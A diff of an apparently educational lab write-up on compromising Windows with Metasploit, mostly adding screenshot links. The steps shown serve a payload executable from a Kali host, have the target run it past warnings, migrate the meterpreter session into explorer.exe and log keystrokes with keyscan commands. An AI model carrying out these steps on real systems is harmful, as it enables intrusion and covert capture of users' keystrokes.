@@ -67,7 +67,6 @@ set LHOST 0.0.0.0
 
 
 
-
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
@@ -82,12 +81,14 @@ Bypass any warning boxes, double-click the file, and allow it to run.
 
 On kali/parrot give the command exploit
 ## OUTPUT:
+![exploit output](images/exploit_output.jpg)
 
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ## OUTPUT:
+![ps output](images/ps_output.jpg)
 
 
 
@@ -98,13 +99,14 @@ At the meterpreter > prompt, execute this command:
 
 migrate -N explorer.exe
 ## OUTPUT:
-
+![migrate output](images/migrate_output.jpg)
 
 at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
 ## OUTPUT:
+![netstat output](images/netstat_output.jpg)
 
 
 
@@ -112,17 +114,20 @@ Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 ## OUTPUT:
+![keyscan output](images/keyscan_output.jpg)
 
 
 
 
 keyscan_dump	Shows the keystrokes captured so far
 ## OUTPUT:
+![keyscan dump output](images/keyscan_output.jpg)
+
+## RESULT:
+The Metasploit framework is  used to compromise windows and is examined successfully.
 
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
 
 
-## RESULT:
-The Metasploit framework is  used to compromise windows and is examined successfully.
